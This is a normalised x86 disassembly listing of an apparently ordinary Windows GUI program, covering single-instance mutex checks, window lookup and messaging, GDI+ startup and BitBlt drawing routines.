mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push ebx
lea eax [ esi + 0x1d4 ]
push eax
call sub_40da20
test eax eax
jne r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp eax 0xf
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x21c ] edi
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0x18 ]
mov [ ecx ] edi
cmp [ eax + 0x21c ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
lea edi [ eax + 0x1 ]
jmp r-xdata
cmp eax 0x318
jne r-xdata
mov esi [ ebp + 0x8 ]
mov [ esi + 0x21c ] edi
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebp + 0x18 ]
mov [ ecx ] 0x0
cmp [ esi + 0x1d0 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
push ecx
push ecx
mov eax esp
mov [ esi + 0x21c ] edi
mov [ ebp + 0x1c ] esp
mov [ eax ] ebx
mov [ ebp - 0x4 ] 0x2
push esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_418f20
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x0
cmp [ esi + 0x21c ] 0x0
je r-xdata
mov edx [ esi + 0x154 ]
mov eax [ eax + 0x70 ]
mov edx [ edx + 0x4 ]
lea ecx [ esi + 0x154 ]
push eax
call edx
mov edx [ ebp + 0x18 ]
mov [ edx ] 0x0
cmp [ esi + 0x21c ] 0x0
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_40dd90
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
push esi
push edi
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov edi [ esi + 0x70 ]
push eax
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov ecx [ ebp + 0x10 ]
lea edx [ esi - 0x1ac ]
push edx
call sub_40db50
mov [ esi + 0x70 ] edi
pop edi
pop esi
pop ebp
retn 0x18
sub_40de00
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
pop ebp
retn 0x4
mov edx [ eax + 0x140 ]
push edx
add eax 0x134
push eax
call sub_419c30
sub_40de50
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push eax
mov eax [ ecx + 0x140 ]
push edx
push eax
lea esi [ ecx + 0x134 ]
call sub_419bb0
pop esi
pop ebx
pop ebp
retn 0x10
sub_40de80
push ebp
mov ebp esp
push 0xffffffff
push sub_444c98
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_40dee0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x28 ]
push edi
call edx
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x2c ]
push edi
mov ecx esi
call edx
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
push edi
push eax
mov ecx esi
call sub_40e940
pop edi
pop esi
pop ebp
retn 0x8
sub_40df20
push ebp
mov ebp esp
push esi
push r--data
push 0x1
push 0x0
mov esi ecx
call [ CreateMutexW@IAT ]
mov [ esi + 0x2c ] eax
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
xor eax eax
pop esi
pop ebp
retn 0x4
mov eax [ esi + 0x2c ]
push edi
push eax
call [ CloseHandle@IAT ]
mov edi [ ebp + 0x8 ]
mov [ esi + 0x2c ] 0x0
call sub_40e210
pop edi
mov eax 0x1
pop esi
pop ebp
retn 0x4
sub_40dfa0
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x38 ]
add eax 0xc
push r--data
push eax
mov ebx 0x8
call sub_402910
xor ecx ecx
push 0x206
push ecx
lea edx [ ebp - 0x20a ]
push edx
mov [ ebp - 0x20c ] cx
call memset
push 0x0
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push r--data
call [ Ordinal_crt_27@IAT ]
add esp 0x1c
cmp [ ebp - 0x20c ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov edx [ rw-data ]
mov [ eax + 0x5c ] 0x2
mov [ eax + 0x68 ] edx
mov [ eax + 0x6c ] 0x82
add eax 0x70
push r--data
push eax
mov ebx 0x5
call sub_402910
lea ecx [ ebp - 0x20c ]
push ecx
call [ PathIsDirectoryW@IAT ]
test eax eax
je r-xdata
push edi
lea edi [ ebp - 0x20c ]
mov eax esi
call sub_40ebf0
pop edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn
sub_40e080
push esi
mov esi ecx
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x28 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x24 ] 0x0
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x28 ] 0x0
push 0x0
push r--data
call [ FindWindowW@IAT ]
mov esi eax
test esi esi
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ esi + 0x2c ] 0x0
pop esi
retn
push esi
call [ IsIconic@IAT ]
test eax eax
je r-xdata
push 0x9
push esi
call [ ShowWindow@IAT ]
sub_40e0f0
push ebp
mov ebp esp
push 0xffffffff
push sub_4452b4
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0xc
call [ operator new@IAT ]
add esp 0x4
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp eax ecx
je r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] cl
mov [ ebp - 0x4 ] 0x1
mov [ eax ] r--data
mov [ ebp - 0x4 ] cl
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x24 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_40e170
push ebp
mov ebp esp
push 0xffffffff
push sub_44afa4
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x10
call [ operator new@IAT ]
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi + 0x28 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi ] r--data
mov [ esi + 0x4 ] al
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
call [ Ordinal_crt_74@IAT ]
mov ecx [ rw-data ]
mov ebx [ rw-data ]
movzx eax al
mov [ esi + 0x8 ] eax
mov ecx [ ecx + 0x8 ]
call sub_40b5f0
mov [ esi + 0xc ] eax
mov [ ebp - 0x4 ] 0x0
mov eax esi
sub_40e210
push ebp
mov ebp esp
sub esp 0xc
push esi
push 0x0
push r--data
push 0x0
push 0x0
call [ FindWindowExW@IAT ]
mov esi eax
test esi esi
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
push esi
call [ IsIconic@IAT ]
mov ebx [ SendMessageW@IAT ]
test eax eax
je r-xdata
push esi
call [ SetForegroundWindow@IAT ]
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
push 0x0
push 0xf120
push 0x112
push esi
call ebx
pop ebx
cmp [ edi ] ax
je r-xdata
mov eax edi
mov [ ebp - 0x4 ] edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
lea ecx [ ebp - 0xc ]
push ecx
sub eax edx
push 0x0
sar eax 0x1
push 0x4a
lea eax [ eax + eax + 0x2 ]
push esi
mov [ ebp - 0x8 ] eax
call ebx
sub_40e2b0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_40e2f0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_40e330
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xb4 ]
push esi
mov esi [ eax ]
cmp esi eax
je r-xdata
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
cmp [ esi + 0x15 ] 0x0
jne r-xdata
cmp [ ecx + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0xb4 ]
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov edx [ edx + 0x20 ]
push edi
push ebx
push eax
call edx
mov eax [ esi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov esi eax
jmp r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
cmp esi [ eax + 0x8 ]
jne r-xdata
jmp r-xdata
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_40e3c0
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x30 ] ecx
mov [ eax + 0x34 ] ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x3c ] ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] ecx
mov [ eax + 0x48 ] ecx
mov [ eax + 0x4c ] ecx
mov [ eax + 0x50 ] ecx
mov [ eax + 0x54 ] ecx
mov [ eax + 0x58 ] ecx
mov [ eax + 0x5c ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] 0x1000000
mov [ eax + 0x28 ] cx
mov [ eax + 0x2a ] cl
mov [ eax + 0x2c ] ecx
mov [ eax + 0x60 ] ecx
mov [ eax + 0x64 ] ecx
mov [ eax + 0x68 ] 0x1
mov [ eax + 0x6c ] ecx
retn
sub_40e430
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_40e490
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
push ecx
push eax
call sub_40e330
pop edi
pop ebx
sub_40e4c0
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x25 ] 0x0
mov [ esi + 0x24 ] 0x1
jne r-xdata
pop esi
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ eax + 0x4 ]
mov [ esi + 0x8 ] eax
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x48 ]
mov edx [ ecx ]
mov eax [ esi + 0x8 ]
mov edx [ edx + 0x4 ]
push esi
push eax
call edx
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov [ esi + 0x18 ] ecx
mov edx [ ecx ]
mov eax [ edx + 0x58 ]
call eax
mov [ esi + 0x1c ] eax
mov eax [ esi + 0x4 ]
mov cl [ eax + 0x19 ]
mov [ esi + 0x26 ] cl
mov dl [ eax + 0xac ]
mov [ esi + 0x27 ] dl
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
call edx
sub_40e550
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x40 ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x44 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x48 ] edx
mov edx [ eax + 0xc ]
mov [ ecx + 0x4c ] edx
mov edx [ eax ]
mov [ ecx + 0x30 ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x34 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x38 ] edx
mov edx [ eax + 0xc ]
mov [ ecx + 0x3c ] edx
mov edx [ eax ]
mov [ ecx + 0x50 ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x54 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x58 ] edx
mov eax [ eax + 0xc ]
mov [ ecx + 0x5c ] eax
pop ebp
retn 0x4
sub_40e5e0
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor al al
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xa0 ] ecx
mov al 0x1
pop ebp
retn 0x4
sub_40e630
push ebx
mov ebx [ edx ]
push esi
mov esi [ ecx ]
add ebx esi
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0x0
mov [ eax + 0xc ] 0x0
mov [ eax ] ebx
test esi esi
jns r-xdata
mov esi [ ecx + 0x4 ]
mov ebx [ edx + 0x4 ]
add ebx esi
mov [ eax + 0x4 ] ebx
test esi esi
jns r-xdata
mov ebx [ edx + 0x8 ]
add ebx esi
mov [ eax ] ebx
mov esi [ ecx + 0x8 ]
mov ebx [ eax ]
add ebx esi
mov [ eax + 0x8 ] ebx
test esi esi
jne r-xdata
mov esi [ edx + 0xc ]
add esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
jns r-xdata
mov esi [ edx + 0x8 ]
mov [ eax + 0x8 ] esi
jmp r-xdata
mov esi [ ecx + 0xc ]
mov ebx [ eax + 0x4 ]
add ebx esi
test esi esi
pop esi
mov [ eax + 0xc ] ebx
pop ebx
jne r-xdata
mov ebx [ edx + 0x8 ]
add ebx esi
mov [ eax + 0x8 ] ebx
mov ecx [ ecx + 0xc ]
test ecx ecx
jns r-xdata
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
retn
retn
mov edx [ edx + 0xc ]
add edx ecx
mov [ eax + 0xc ] edx
sub_40e6c0
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x34 ] eax
mov eax [ eax + 0x8 ]
push edi
mov edi ecx
mov ecx [ eax ]
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
mov [ ebp - 0x2c ] ecx
push eax
mov ecx edi
call edx
mov ebx [ esi + 0x4 ]
mov edx [ edi + 0xc ]
mov ecx [ esi ]
xor eax eax
mov [ ebp - 0x14 ] ebx
mov ebx [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ edi + 0x10 ]
mov [ ebp - 0x1c ] eax
add eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov ebx [ esi + 0xc ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x30 ] 0x0
jmp r-xdata
mov ebx ecx
sub ebx [ esi ]
jne r-xdata
lea eax [ ecx + ebx ]
cmp eax [ esi + 0x8 ]
jle r-xdata
sub edx [ ebp - 0x28 ]
mov ebx edx
cmp [ ebp - 0x30 ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov ebx eax
sub ebx ecx
mov edx [ esi + 0x8 ]
mov [ ebp - 0x3c ] edx
mov edx [ esi + 0xc ]
push 0xcc0020
mov [ ebp - 0x38 ] edx
mov edx [ esi + 0x4 ]
push edx
mov edx [ esi ]
push edx
mov edx [ ebp - 0x2c ]
push edx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
sub eax ecx
push edx
push eax
mov eax [ ebp - 0x14 ]
push eax
push ecx
mov ecx [ ebp - 0x2c ]
push ecx
call [ BitBlt@IAT ]
mov eax [ edi ]
push 0x0
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x34 ]
lea edx [ ebp - 0x18 ]
push edx
mov edx [ eax + 0x14 ]
push ecx
mov ecx edi
call edx
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov ebx [ esi + 0xc ]
mov eax [ ebp - 0x1c ]
mov edx eax
sub edx [ ebp - 0x24 ]
mov ecx ebx
sub ecx [ esi + 0x4 ]
cmp edx ecx
je r-xdata
mov ecx [ ebp - 0x18 ]
inc [ ebp - 0x30 ]
add ecx ebx
mov [ ebp - 0x18 ] ecx
cmp ecx [ esi + 0x8 ]
jl r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi ]
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x18 ] edx
mov edx [ esi + 0x8 ]
mov edi ebx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edi
jmp r-xdata
mov edi ecx
sub edi [ esi + 0x4 ]
jne r-xdata
lea eax [ edi + ecx ]
cmp eax ebx
jle r-xdata
sub eax [ ebp - 0x24 ]
mov edi eax
mov ebx [ esi + 0x8 ]
push 0xcc0020
mov [ ebp - 0x3c ] ebx
mov ebx [ esi + 0xc ]
mov [ ebp - 0x38 ] ebx
mov ebx [ esi + 0x4 ]
push ebx
mov ebx [ esi ]
push ebx
mov ebx [ ebp - 0x2c ]
push ebx
mov [ ebp - 0xc ] eax
sub eax ecx
push eax
mov eax [ ebp - 0x18 ]
sub edx eax
push edx
push ecx
push eax
push ebx
call [ BitBlt@IAT ]
mov ecx [ ebp - 0x14 ]
mov ebx [ esi + 0xc ]
add ecx edi
mov [ ebp - 0x14 ] ecx
cmp ecx ebx
jl r-xdata
mov eax [ esi + 0xc ]
mov edi eax
sub edi ecx
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
sub_40e860
push ebp
mov ebp esp
push 0xffffffff
push sub_44809c
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x4 ] 0x0
lea edi [ esi + 0x4 ]
je r-xdata
test [ ebp + 0x8 ] 0x1
je r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push edi
call sub_403d20
mov [ esi + 0xc ] 0x0
lea eax [ esi + 0x10 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ edi ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40e900
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_40e940
push ebp
mov ebp esp
push 0xffffffff
push sub_449e84
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push 0x0
lea edx [ esi + 0x10 ]
push edx
lea ebx [ esi + 0x20 ]
push ebx
mov [ rw-data ] eax
mov [ esi + 0x8 ] ecx
call [ GdiplusStartup@IAT ]
push 0xd0
call [ operator new@IAT ]
mov edi eax
add esp 0x4
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
test edi edi
je r-xdata
xor edi edi
push edi
call sub_425f80
mov [ ebp - 0x4 ] 0x1
mov [ edi ] r--data
mov [ edi + 0x14 ] r--data
mov [ edi + 0x34 ] r--data
mov [ edi + 0x40 ] r--data
mov [ rw-data ] edi
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebx ]
push eax
mov [ esi + 0x4 ] 0x0
call [ GdiplusShutdown@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ eax + 0x14 ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x4 ] edi
call sub_40ea40
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov ecx esi
call edx
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x40 ]
mov edx [ eax + 0x8 ]
add ecx 0x40
call edx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
sub_40ea40
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44805a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
push ebx
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x48 ]
mov [ fs : 0x0 ] eax
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x40 ]
mov edx [ eax + 0x4 ]
add ecx 0x40
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edx [ eax + 0x14 ]
mov ecx esi
call edx
mov ebx eax
mov eax [ esi ]
mov edx [ eax + 0x18 ]
mov ecx esi
call edx
cmp ebx edi
je r-xdata
cmp eax edi
je r-xdata
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x44 ] ebx
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x48 ] eax
mov [ esp + 0xc ] r--data
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
mov [ esp + 0x50 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x50 ] 0x2
lea eax [ esp + 0xc ]
push eax
call sub_40f070
mov edx [ esi ]
mov eax [ edx + 0x10 ]
mov ecx esi
call eax
test eax eax
je r-xdata
call sub_40ee70
mov [ esp + 0x50 ] 0xffffffff
lea ecx [ esp + 0xc ]
push ecx
call sub_40eb50
mov eax edi
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn
lea edi [ esp + 0xc ]
call sub_40efd0
mov edi eax
sub_40eb50
push ebp
mov ebp esp
push 0xffffffff
push sub_444c66
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x10 ]
mov ebx [ free@IAT ]
cmp eax edi
je r-xdata
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call ebx
add esp 0x4
mov [ esi + 0x10 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call ebx
add esp 0x4
mov [ esi + 0x4 ] edi
sub_40ebf0
push ebx
push esi
mov esi [ eax + 0x4 ]
lea eax [ esi + 0x60 ]
push 0x0
push eax
xor ebx ebx
mov [ esi + 0x5c ] 0x1
call sub_402910
add esi 0x64
test edi edi
jne r-xdata
mov eax edi
lea edx [ eax + 0x2 ]
xor eax eax
push edi
push esi
mov ebx eax
call sub_402910
pop esi
pop ebx
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push edi
push esi
mov ebx eax
call sub_402910
pop esi
pop ebx
retn
sub_40ec50
push ebp
mov ebp esp
push 0xffffffff
push sub_448019
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x4 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x8 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x3
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x14 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40ecf0
push ebp
mov ebp esp
push 0xffffffff
push sub_446339
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
or edi 0xffffffff
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
xor cl cl
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x4 ] edi
lea eax [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
[ ecx ] edi
dec edi
test edi edi
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_40edc0
push edi
mov edi eax
